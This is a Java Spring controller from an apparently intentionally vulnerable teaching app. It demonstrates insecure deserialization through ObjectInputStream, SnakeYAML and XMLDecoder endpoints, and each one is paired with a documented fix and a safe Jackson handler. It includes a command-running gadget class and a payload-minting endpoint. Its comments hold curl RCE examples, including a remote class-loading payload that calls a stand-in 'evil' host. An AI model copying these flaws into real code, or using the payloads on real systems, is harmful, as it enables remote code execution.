package com.example.vulnapp.vulns;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import org.yaml.snakeyaml.Yaml;

import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * Insecure Deserialization / Software &amp; Data Integrity Failures —
 * OWASP 2021 A08 | OWASP 2025 A08.
 *
 * Comment/annotation format mirrors {@link SqlInjectionController} (the reference
 * module): every permutation carries a standard header describing the flaw, its
 * CWE, an exploitation-likelihood rating, greenfield-vs-legacy prevalence, an
 * example request, and the corresponding safe pattern. The dangerous line in each
 * handler is tagged with a "VULNERABLE:" inline comment. The file ends with ONE
 * clearly-labelled SAFE reference handler.
 *
 * PRIMARY CWE: CWE-502 Deserialization of Untrusted Data (P3 also CWE-95, code
 * execution via dynamically evaluated directives).
 *
 * NOTE (P1): real-world native-deserialization RCE relies on a "gadget chain"
 *   already present on the classpath (Commons-Collections, Spring, etc.). This
 *   demo ships its OWN gadget ({@link RceGadget}) whose readObject() runs a
 *   command, so the RCE is reproducible on this exact classpath with no external
 *   library. The defect on show is still the genuine sink — ObjectInputStream
 *   .readObject() over attacker-controlled bytes reconstructs whatever type the
 *   stream names and fires its magic methods before any validation.
 */
@RestController
@RequestMapping("/deserialization")
public class DeserializationController {

    // ========================================================================
    // PERMUTATION 1 — Native Java deserialization of attacker-controlled bytes
    // OWASP 2021 A08 Software and Data Integrity Failures  ->  OWASP 2025 A08 Software and Data Integrity Failures
    // CWE-502: Deserialization of Untrusted Data
    // EXPLOITATION LIKELIHOOD: HIGH — readObject() reconstructs any serializable
    //   type named in the stream and runs its readObject/finalize magic methods
    //   BEFORE the app sees the object; deterministic RCE once a gadget chain is on
    //   the classpath (this demo ships one, so it is turn-key). Caveat: on a target
    //   with no usable gadget it degrades to type-confusion/DoS, hence not CRITICAL.
    // PREVALENCE TODAY: greenfield LOW (modern Java exchanges JSON/protobuf, never
    //   raw Java serialization; records/DTOs + JEP 290 serialization filters are the
    //   norm and SAST flags ObjectInputStream on request data) | legacy/10yr
    //   tech-debt HIGH (RMI/JMX/EJB, HTTP-session blobs, cached serialized objects
    //   and old frameworks pass untrusted bytes straight to readObject everywhere).
    // EXAMPLE:
    //   B64=$(curl -s 'http://127.0.0.1:8080/deserialization/native/payload?cmd=id' | grep -o '"payload_b64":"[^"]*' | cut -d'"' -f4)
    //   curl -X POST 'http://127.0.0.1:8080/deserialization/native' --data-urlencode "data=$B64"
    //   -> response.value shows the output of `id`, executed inside readObject().
    // FIX: never deserialize untrusted input with ObjectInputStream; use a data
    //   format (JSON) bound to a fixed DTO, or install a strict JEP-290 allow-list
    //   ObjectInputFilter. See the SAFE reference handler at the bottom.
    // ========================================================================
    @PostMapping("/native")
    public Map<String, Object> nativeDeser(@RequestParam(defaultValue = "") String data) {
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("input_b64", data);
        try {
            byte[] bytes = Base64.getDecoder().decode(data);
            Object obj;
            // VULNERABLE: attacker-controlled bytes fed straight into ObjectInputStream;
            // readObject() materializes an arbitrary type and triggers its magic methods.
            try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
                obj = ois.readObject();
            }
            out.put("deserialized_class", obj == null ? null : obj.getClass().getName());
            out.put("value", String.valueOf(obj)); // for RceGadget this includes the command output
        } catch (Exception e) {
            out.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        return out;
    }

    /**
     * Helper: mints a ready-to-use native-serialization payload so P1 is curl-able
     * end-to-end without ysoserial. Serializing an {@link RceGadget} is harmless
     * (writeObject runs no gadget code); the command only fires when the bytes are
     * later deserialized by {@code POST /deserialization/native}.
     */
    @GetMapping("/native/payload")
    public Map<String, Object> nativePayload(@RequestParam(defaultValue = "id") String cmd) throws IOException {
        RceGadget gadget = new RceGadget(new String[] {"sh", "-c", cmd});
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(gadget);
        }
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("cmd", cmd);
        out.put("payload_b64", Base64.getEncoder().encodeToString(bos.toByteArray()));
        out.put("note", "POST this as data= to /deserialization/native to run the command inside readObject().");
        return out;
    }

    // ========================================================================
    // PERMUTATION 2 — Unsafe config-format deserialization (SnakeYAML load)
    // OWASP 2021 A08 Software and Data Integrity Failures  ->  OWASP 2025 A08 Software and Data Integrity Failures
    // CWE-502: Deserialization of Untrusted Data
    // EXPLOITATION LIKELIHOOD: MEDIUM — new Yaml().load() is the general-purpose,
    //   type-constructing loader (unsafe-by-pattern), so untrusted YAML drives Java
    //   object construction. SnakeYAML 2.x ships a default TagInspector that blocks
    //   the classic !!javax.script.ScriptEngineManager RCE global tag, so today this
    //   is realistically type-confusion / resource abuse rather than turn-key RCE —
    //   hence MEDIUM, not HIGH. On SnakeYAML 1.x the same call is direct RCE.
    // PREVALENCE TODAY: greenfield LOW (Spring Boot pins SnakeYAML 2.x which is
    //   safe-by-default, and config is parsed to typed @ConfigurationProperties) |
    //   legacy/10yr tech-debt HIGH (SnakeYAML 1.x new Yaml().load() on user-supplied
    //   config/import files is a long-lived, fully-RCE pattern still in production).
    // EXAMPLE:
    //   curl -X POST 'http://127.0.0.1:8080/deserialization/yaml' \
    //        --data-urlencode 'data=!!java.util.HashMap [{k: v}]'
    //   RCE payload (works on SnakeYAML 1.x; blocked by 2.x default TagInspector):
    //     data=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil/"]]]]
    // FIX: parse with SnakeYAML's SafeConstructor (new Yaml(new SafeConstructor(...)))
    //   or bind to a fixed schema; never call the type-constructing load() on
    //   untrusted input. See the SAFE reference handler at the bottom.
    // ========================================================================
    @PostMapping("/yaml")
    public Map<String, Object> yaml(@RequestParam(defaultValue = "") String data) {
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("input", data);
        try {
            // VULNERABLE: general-purpose SnakeYAML loader instantiates arbitrary
            // declared Java types from '!!' global tags in untrusted input.
            Object obj = new Yaml().load(data);
            out.put("loaded_class", obj == null ? null : obj.getClass().getName());
            out.put("value", String.valueOf(obj));
        } catch (Exception e) {
            out.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        return out;
    }

    // ========================================================================
    // PERMUTATION 3 — XMLDecoder over attacker-controlled XML (JDK-only RCE)
    // OWASP 2021 A08 Software and Data Integrity Failures  ->  OWASP 2025 A08 Software and Data Integrity Failures
    // CWE-502: Deserialization of Untrusted Data (also CWE-95: Improper Neutralization
    //   of Directives in Dynamically Evaluated Code)
    // EXPLOITATION LIKELIHOOD: CRITICAL — java.beans.XMLDecoder treats the document
    //   as a program: <object class=...> instantiates any class and <void method=...>
    //   invokes any method (e.g. ProcessBuilder.start). Reliable RCE with ONLY the
    //   JDK — no gadget library, no special classpath — from a single request.
    // PREVALENCE TODAY: greenfield RARE (no modern code chooses XMLDecoder for
    //   untrusted input; it is a notorious footgun that SAST and reviewers reject) |
    //   legacy/10yr tech-debt MEDIUM (old apps that persisted JavaBeans as XML for
    //   config/state, and SOAP/RPC-era plumbing, still feed request data to it).
    // EXAMPLE (raw XML body runs `touch data/pwned_by_xmldecoder`):
    //   curl -X POST 'http://127.0.0.1:8080/deserialization/xml' -H 'Content-Type: application/xml' --data-binary '
    //   <java version="17" class="java.beans.XMLDecoder">
    //     <object class="java.lang.ProcessBuilder">
    //       <array class="java.lang.String" length="3">
    //         <void index="0"><string>sh</string></void>
    //         <void index="1"><string>-c</string></void>
    //         <void index="2"><string>touch data/pwned_by_xmldecoder</string></void>
    //       </array>
    //       <void method="start"/>
    //     </object>
    //   </java>'
    //   -> decoded_class = java.lang.Process (a real child process was spawned).
    // FIX: never use XMLDecoder on untrusted input; parse XML with a data-binding
    //   layer (JAXB to a fixed schema) with external entities/DTDs disabled, or use
    //   JSON bound to a DTO. See the SAFE reference handler at the bottom.
    // ========================================================================
    @PostMapping("/xml")
    public Map<String, Object> xml(@RequestBody(required = false) String body) {
        Map<String, Object> out = new LinkedHashMap<>();
        String xml = body == null ? "" : body;
        out.put("input", xml);
        try {
            Object obj;
            // VULNERABLE: XMLDecoder executes the class/method directives embedded in
            // the document — arbitrary instantiation + method calls == RCE (JDK only).
            try (XMLDecoder decoder =
                         new XMLDecoder(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)))) {
                obj = decoder.readObject();
            }
            out.put("decoded_class", obj == null ? null : obj.getClass().getName());
            out.put("value", String.valueOf(obj));
        } catch (Exception e) {
            out.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        return out;
    }

    // ========================================================================
    // SAFE REFERENCE — parse untrusted config as plain DATA into a FIXED DTO.
    // Jackson's ObjectMapper does not enable polymorphic/default typing, so the
    // document can only populate the declared fields of {@link SafeConfig}; it can
    // never name a Java type to instantiate and can never invoke a method. Contrast
    // with P1 (ObjectInputStream), P2 (Yaml.load) and P3 (XMLDecoder), all of which
    // let the input choose the types/behaviour. Shown so the vulnerable/safe pair
    // can be diffed by SAST tooling and learners.
    //   curl -X POST 'http://127.0.0.1:8080/deserialization/safe' \
    //        -H 'Content-Type: application/json' \
    //        --data '{"name":"prod","retries":3,"enabled":true,"role":"admin"}'
    //   -> "role" is simply ignored; only name/retries/enabled bind, no code runs.
    // ========================================================================
    @PostMapping("/safe")
    public Map<String, Object> safe(@RequestBody(required = false) String json) {
        Map<String, Object> out = new LinkedHashMap<>();
        try {
            ObjectMapper mapper = new ObjectMapper();
            // SAFE: default typing is OFF (Jackson's default), and unknown keys are
            // ignored — the payload cannot pick a class or reach a method.
            mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
            SafeConfig cfg = mapper.readValue(json == null || json.isBlank() ? "{}" : json, SafeConfig.class);
            out.put("parser", "Jackson ObjectMapper -> fixed DTO (no polymorphic/default typing)");
            Map<String, Object> parsed = new LinkedHashMap<>();
            parsed.put("name", cfg.name);
            parsed.put("retries", cfg.retries);
            parsed.put("enabled", cfg.enabled);
            out.put("config", parsed);
            out.put("note", "Only declared fields bind; the input cannot name a type or invoke a method.");
        } catch (Exception e) {
            out.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        return out;
    }

    /** Fixed target DTO for the SAFE handler — only these fields can ever be set. */
    public static class SafeConfig {
        public String name;
        public int retries;
        public boolean enabled;
    }

    /**
     * Demo gadget for PERMUTATION 1. Its readObject() runs a command the instant the
     * object graph is reconstructed — the essence of a deserialization "gadget".
     * In a real attack this role is played by classes already on the classpath;
     * shipping one here makes the native-deserialization RCE reproducible without
     * pulling in ysoserial or Commons-Collections.
     */
    public static class RceGadget implements Serializable {
        private static final long serialVersionUID = 1L;
        private final String[] command;
        private transient String commandOutput;

        public RceGadget(String[] command) {
            this.command = command;
        }

        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            // Runs during deserialization, before the caller ever "uses" the object.
            try {
                Process p = new ProcessBuilder(command).redirectErrorStream(true).start();
                this.commandOutput = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
                p.waitFor(10, TimeUnit.SECONDS);
            } catch (Exception e) {
                this.commandOutput = "gadget-exec-error: " + e;
            }
        }

        @Override
        public String toString() {
            return "RceGadget{command=" + Arrays.toString(command)
                    + ", commandOutput=" + commandOutput + "}";
        }
    }
}
